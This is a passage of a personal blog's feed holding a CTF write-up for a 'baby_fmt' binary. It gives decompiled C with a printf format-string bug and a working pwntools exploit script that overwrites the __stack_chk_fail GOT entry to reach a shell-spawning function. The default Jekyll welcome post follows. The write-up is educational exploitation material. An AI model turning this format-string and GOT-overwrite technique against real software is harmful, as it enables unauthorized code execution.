    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span>
    <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>

    <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Tell me some funny things!"</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
    <span class="n">funny</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">"funny"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">funny</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">stuff</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span>
        <span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compiled with <code class="language-plaintext highlighter-rouge">canary</code>, <code class="language-plaintext highlighter-rouge">NX</code> enabled, <code class="language-plaintext highlighter-rouge">Partial RELRO</code> and <code class="language-plaintext highlighter-rouge">NO PIE</code>.</p>

<h2 id="vulnerability-overview">Vulnerability Overview</h2>

<ol>
  <li>
    <p><strong>Format-String Bug</strong>:
Calling <code class="language-plaintext highlighter-rouge">printf(buf)</code> without a format string allows both reads and writes via <code class="language-plaintext highlighter-rouge">%n</code>.</p>
  </li>
  <li>
    <p><strong>Custom Encoder</strong>:
The <code class="language-plaintext highlighter-rouge">stuff()</code> function shifts lowercase letters and digits by <code class="language-plaintext highlighter-rouge">(index mod 7)</code> (similar to a caesar cipher) before <code class="language-plaintext highlighter-rouge">printf</code>.</p>
  </li>
</ol>

<h2 id="exploit-strategy">Exploit Strategy</h2>

<ol>
  <li>Prefix input with <code class="language-plaintext highlighter-rouge">"funny"</code> so <code class="language-plaintext highlighter-rouge">strstr(buf, "funny")</code> succeeds.</li>
  <li>Build a format-string payload to overwrite the GOT entry for <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code> with the address of <code class="language-plaintext highlighter-rouge">win()</code>.</li>
  <li>Pre-encode the payload so that after <code class="language-plaintext highlighter-rouge">stuff()</code> applies its shifts, the format specifiers and target address are correct.</li>
  <li>When the canary check fails, <code class="language-plaintext highlighter-rouge">__stack_chk_fail()</code> is called â€” now redirected to <code class="language-plaintext highlighter-rouge">win()</code> â€” giving a shell.</li>
</ol>

<h2 id="exploit-script">Exploit Script</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">pwn</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getcwd</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">speed</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">#.5
</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./baby_fmt_patched"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">e</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"kitty"</span><span class="p">,</span> <span class="s">"@"</span><span class="p">,</span> <span class="s">"new-window"</span><span class="p">,</span> <span class="s">"--cwd"</span><span class="p">,</span> <span class="n">getcwd</span><span class="p">()]</span>
<span class="n">context</span><span class="p">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s">"/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"</span>

<span class="n">r</span><span class="p">:</span> <span class="n">process</span> <span class="o">=</span> <span class="bp">None</span>

<span class="n">u64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u64</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
<span class="n">u32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u32</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">u16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u16</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)[:</span><span class="mi">2</span><span class="p">])</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
<span class="n">recv</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">())[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">recvn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">a</span><span class="p">))[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">recvu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="bp">True</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">clean</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">fail</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">info</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
    b main
    continue
'''</span>

<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">r</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"gdb"</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">e</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">generate_input_bytes</span><span class="p">(</span><span class="n">desired_output</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
    <span class="n">input_bytes</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">desired_output</span><span class="p">):</span>
        <span class="n">shift</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">%</span> <span class="mi">7</span>

        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'z'</span><span class="p">):</span>
            <span class="n">original</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="n">shift</span>
            <span class="k">if</span> <span class="n">original</span> <span class="o">&lt;</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">):</span>
                <span class="n">original</span> <span class="o">+=</span> <span class="mi">26</span>
            <span class="n">input_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">original</span><span class="p">)</span>

        <span class="k">elif</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'0'</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'9'</span><span class="p">):</span>
            <span class="n">original</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="n">shift</span>
            <span class="k">if</span> <span class="n">original</span> <span class="o">&lt;</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'0'</span><span class="p">):</span>
                <span class="n">original</span> <span class="o">+=</span> <span class="mi">10</span>
            <span class="n">input_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">original</span><span class="p">)</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="n">input_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">input_bytes</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">win</span> <span class="o">=</span> <span class="mh">0x4015cd</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"funny123"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__stack_chk_fail'</span><span class="p">]</span> <span class="p">:</span> <span class="n">win</span><span class="p">},</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_input_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"funny"</span><span class="o">+</span><span class="n">payload</span><span class="p">[</span><span class="mi">5</span><span class="p">::]</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">106</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"good luck pwning :)"</span><span class="p">)</span>



<span class="n">conn</span><span class="p">()</span>
<span class="n">exploit</span><span class="p">()</span>

<span class="c1"># good luck pwning :)
</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><em>good luck pwning :)</em></p>

<h2 id="getting-the-flag">Getting the flag</h2>

<p>That was the ez partâ€¦ The hard part was how to get the flag since there is no service to connect to.</p>

<p>After countless hours (2) of social enginnering the sh*t out of the admins by showing and proving that the solve is correctâ€¦</p>

<details><summary>I got the flag</summary>BitCTF{f0rm4t_str1ng_bugs_ar3_ez} </details>]]></content><author><name></name></author><category term="BitSiege" /><category term="CTF" /><summary type="html"><![CDATA[We are given a 64-bit ELF binary (baby_fmt) that reads a string from the user, applies a custom encoder and then prints it out via printf() if the input contains "funny". But since the output is not formatted itâ€™s vulnerable to the fsb. I exploited it by overwriting the got of __stack_chk_fail with a hidden function that calls system("/bin/sh"):]]></summary></entry><entry><title type="html">Welcome to Jekyll!!</title><link href="https://psjsus4.github.io//jekyll/update/2025/05/07/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!!" /><published>2025-05-07T19:25:22+00:00</published><updated>2025-05-07T19:25:22+00:00</updated><id>https://psjsus4.github.io//jekyll/update/2025/05/07/welcome-to-jekyll</id><content type="html" xml:base="https://psjsus4.github.io//jekyll/update/2025/05/07/welcome-to-jekyll.html"><![CDATA[<p>Youâ€™ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>To add new posts, simply add a file in the <code class="language-plaintext highlighter-rouge">_posts</code> directory that follows the convention <code class="language-plaintext highlighter-rouge">YYYY-MM-DD-name-of-post.ext</code> and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
<span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyllâ€™s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[Youâ€™ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>